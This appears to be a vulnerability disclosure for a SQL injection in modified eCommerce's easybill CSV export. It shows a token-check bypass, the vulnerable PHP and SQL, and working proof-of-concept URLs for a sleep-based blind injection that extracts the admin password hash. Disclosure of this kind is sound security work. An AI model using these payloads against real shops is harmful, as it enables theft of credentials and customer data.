Product Description:
modified eCommerce is an Open Source shopsoftware
 
Vulnerability Details:
Attackable are the GET-parameters &#039;orders_status&#039; and &#039;customers_status&#039; through &#039;easybillcsv.php&#039;:
 
 
File: [shoproot]/api/easybill/easybillcsv.php
 
[24]        if (isset($_GET[&#039;token&#039;]) &&  $_GET[&#039;token&#039;] == MODULE_EASYBILL_CSV_CRON_TOKEN) {
[25-61]         ...
[62]            } else {
[63]                    die(&#039;Direct Access to this location is not allowed.&#039;);
 
As default option the easybill-module is not installed and the constant MODULE_EASYBILL_CSV_CRON_TOKEN is not set. As long as the easybill-module is not installed, it is possible to bypass the restriction: [Shoproot]/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN
 
 
[35]            if (count($_GET[&#039;orders_status&#039;]) > 0) {
[37]            $orders_status = explode(&#039;,&#039;, $_GET[&#039;orders_status&#039;]);
[38]            $module->from_orders_status = implode("&#039;, &#039;", $orders_status);
[39]            }
 
 
[43]            if (isset($_GET[&#039;customers_status&#039;])) {
[45]            $customers_status = explode(&#039;,&#039;, $_GET[&#039;customers_status&#039;]);
[46]            $module->from_customers_status = implode("&#039;, &#039;", $customers_status);
[47]            }
 
As you can see in lines 35-39 and 43-47 the GET-parameters &#039;orders_status&#039; and &#039;customers_status&#039; are not escaped, but formatted (removed whitespaces, replaced commas with "&#039;, &#039;"). They will be set as local variables of the "$module"-object.
 
File: [shoproot][admin-folder]/includes/modules/system/easybillcsv.php
 
[63]        $export_query = xtc_db_query("SELECT DISTINCT o.orders_id 
[64]                                    FROM ".TABLE_ORDERS." o
[65]                                    JOIN ".TABLE_ORDERS_STATUS_HISTORY." osh
[66]                                      ON o.orders_id = osh.orders_id    
[67]                                   WHERE (o.orders_status IN (&#039;" . $this->from_orders_status . "&#039;) 
[68]                                          OR osh.orders_status_id IN (&#039;" . $this->from_orders_status . "&#039;))
[69]                                     AND (o.last_modified >= &#039;". date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "&#039;
[70]                                          OR o.date_purchased >= &#039;". date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "&#039;)
[71]                                     AND o.customers_status IN (&#039;" . $this->from_customers_status . "&#039;)
[72]                                ORDER BY o.orders_id");
 
 
The unescaped GET-parameters get placed in the query on line 67, 68 and 71.
Through the ORDER BY statement (with the explicit table-references) it is not possible to use a union-based injection.
The injection cannot include whitespaces or commas.
 
POC [Proof of Concept]:
 
http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111&#039;))or-sleep(5)/*&customers_status=*/%23
Will result in following query and execute the sleep-function for 5 seconds:
 
SELECT DISTINCT o.orders_id 
                                   FROM ".TABLE_ORDERS." o
                                    JOIN ".TABLE_ORDERS_STATUS_HISTORY." osh
                                      ON o.orders_id = osh.orders_id    
                                   WHERE (o.orders_status IN (&#039;-111&#039;))or-sleep(5)/* 
     
                                    long comment
                                          
                                    */#comment
                               ORDER BY o.orders_id
 
There are multiple ways to bypass the whitespace/comma-filter. A possible way to check if the first character of the admin-hash is &#039;$&#039; would be:
 
 
http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111&#039;))or(Select(case(36)when(ascii(substring(`customers_password`FROM(1)FOR(1))))then-sleep(5)End)from`customers`where`customers_id`=1)/*&customers_status=*/%23
